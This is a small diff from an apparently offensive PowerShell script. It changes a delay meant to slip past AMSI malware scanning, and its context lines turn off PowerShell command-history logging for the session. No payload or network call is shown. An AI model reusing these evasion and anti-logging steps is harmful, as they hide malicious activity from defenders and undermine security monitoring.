@@ -57,7 +57,7 @@
 )
 
 
-$DelayTime = "14" ## Delay in case amsi starts to scan exec!
+$DelayTime = "15" ## Delay in case amsi starts to scan exec!
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
